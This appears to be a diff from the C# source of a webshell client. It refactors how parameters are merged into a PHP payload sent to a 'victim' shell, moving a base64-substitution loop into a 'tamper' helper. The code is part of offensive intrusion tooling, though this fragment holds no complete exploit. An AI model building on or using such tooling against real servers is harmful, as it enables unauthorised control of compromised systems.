@@ -505,16 +505,7 @@ namespace Alien
 
             if (m_victim.ShellPayloadType == enPayloadType.ECDH)
             {
-                for (int i = 0; i < asParams.Length; i++)
-                {
-                    //szPayload = szPayload.Replace($"z{i}", clsEzData.fnszStre2b64(asParams[i]));
-                    switch (m_victim.ShellLanguage)
-                    {
-                        case enLanguage.PHP:
-                            szPayload = szPayload.Replace($"$_POST['z{i}']", $"\"{clsEzData.fnszStre2b64(asParams[i])}\"");
-                            break;
-                    }
-                }
+                szPayload = clsTamper.fnMergePayloadToOne(szPayload, asParams, m_victim.ShellLanguage);
             }
             else
             {
